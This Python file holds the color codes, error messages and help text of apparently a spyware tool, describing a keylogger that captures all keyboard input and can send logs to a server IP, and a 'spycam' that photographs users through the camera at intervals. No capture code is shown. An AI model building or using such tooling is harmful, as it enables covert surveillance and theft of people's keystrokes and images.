class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    GREEN = '\033[1;32m'

class Errors:
    NOARG = Colors.FAIL+'[Err] : You need to gives arguments to use the program'+Colors.ENDC
    BADARG = Colors.FAIL+'[Err] : You don\'t use the program correctly '+Colors.ENDC
    BADUSAGEKEYLOG = Colors.FAIL+'[Err] : Bad usage of the keylogger functions, see help center'+Colors.ENDC
    BADIP = Colors.FAIL+'[Err] : Bad pattern of the IP argument, required ?.?.?.?'+Colors.ENDC
    BADFILE = Colors.FAIL+'[Err] : Bad file destination for the keylogger log, required [name].[format]'+Colors.ENDC
    NOIP = Colors.FAIL+'[Err] : Need a specific Ip or File destination with the keylogger'+Colors.ENDC
    BADUSAGESPYCAM = Colors.FAIL+'[Err] : Bad usage of the spycam functions, see help center'+Colors.ENDC
    NODELAY = Colors.FAIL+'[Err] : You don\'t give delay for the spycam function'+Colors.ENDC
    BADDELAY = Colors.FAIL+'[Err] : Bad delay for spycam log, required integer'+Colors.ENDC
    '''
        HELP CENTER 
    '''
    HELP = '\n'+(' '*14)+Colors.BOLD+'-- help center --'+Colors.ENDC+(' '*14)+'\n '+Colors.UNDERLINE+'usage :\n'+Colors.ENDC+'      python3 main.py [function1] [function2] ... \n\n '+Colors.UNDERLINE+'available functions :\n'+Colors.ENDC+'   + the keylogger : capture all keyboard inputs\n      -> [keylogger --file inputs.txt] :    write in ./RESULT/inputs.txt\n      -> [keylogger --ip ?.?.?.?] :    send log to the server ip\n\n'+'   + the spycam : capture picture from the camera with a regular time interval\n     -> [spycam --delay 20] : every 20 seconds an image will be added to ./PICTURE/'+'\n '+Colors.UNDERLINE+'example usage :'+Colors.ENDC+'\n   python3 main.py keylogger --file truc.txt\n'
    